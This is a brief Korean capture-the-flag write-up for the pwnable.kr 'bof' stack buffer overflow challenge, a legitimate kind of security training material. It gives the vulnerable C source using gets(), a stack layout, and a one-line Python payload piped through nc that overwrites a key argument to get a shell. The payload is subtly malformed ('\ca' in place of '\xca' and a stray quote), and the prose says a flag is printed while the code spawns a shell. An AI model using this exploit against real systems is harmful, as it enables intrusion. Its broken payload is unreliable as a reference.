# bof
이 문제는 사용자로부터 유효값 검증없이 입력을 받아 overflow 취약점이 존재한다. key 라는 변수의 값에 0xcafebabe 값과 동일하게 맞춰줄 경우 플래그를 출력한다. < 소스코드 참조 >

gdb 로 디버깅 해보면 스택의 구조는 다음과 같다.

| overflowme(32byte) | dummy(12byte) | sfp(4byte) | ret(4byte) | key(0xdeadbeef) |

즉, 52byte 만큼 덮어쓰면, key 값을 변경할 수 있다.


```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

최종 페이로드는 아래와 같다.

* (python -c 'print "A"*52 + "\xbe\xba\xfe\ca""') | nc pwnable.kr 9000